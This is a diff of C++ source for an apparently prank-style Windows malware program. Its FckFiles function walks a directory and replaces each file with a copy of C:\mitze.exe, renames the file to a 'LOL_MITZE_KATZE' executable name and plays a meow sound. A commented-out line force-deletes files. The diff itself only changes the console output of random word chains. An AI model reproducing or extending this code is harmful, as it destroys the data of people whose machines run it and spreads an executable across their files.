@@ -40,17 +40,8 @@ void FckFiles(std::string directory, std::string fileFilter, bool recursively = 
 		while (FindNextFile(hFind, &FindFileData) != 0)
 		{
 			if (!recursively)
-			{
-				Chain = Chain + sWords[rand() % 4];
-				Chain = Chain + sWords[rand() % 4];
-				Chain = Chain + sWords[rand() % 4];
-				Chain = Chain + sWords[rand() % 4];
-				Chain = Chain + sWords[rand() % 4];
-				Chain = Chain + sWords[rand() % 4];
-				Chain = Chain + sWords[rand() % 4];
-				Chain = Chain + sWords[rand() % 4];
-				Chain = Chain + sWords[rand() % 4];
-				cout << Chain;
+			{	
+
 				string Chickfila = directory + std::string(FindFileData.cFileName);
 				mciSendString("play meow.mp3", NULL, 0, NULL);
 				string Dutter = "del /f  "+ string(Chickfila);
@@ -61,6 +52,20 @@ void FckFiles(std::string directory, std::string fileFilter, bool recursively = 
 				//system(("del /f  "+ string(Chickfila)).c_str());
 				system(("copy C:\\mitze.exe /Y "+ string(Chickfila)).c_str());
 				rename(Chickfila.c_str(),"LOL_MITZE_KATZE.exe"+rand() % 999999);
+				int num = 11;
+				int num2 = 69;
+				string Spac = " ";
+				Chain = "";
+				for(int i=0; i<num2; i++)
+				{
+					cout << "\n";
+				}	
+				for(int i=0; i<num; i++)
+				{
+					cout << Chain;
+				    Chain = Chain + sWords[rand() % 4];
+				}		
+
 			}
 			else
 			{
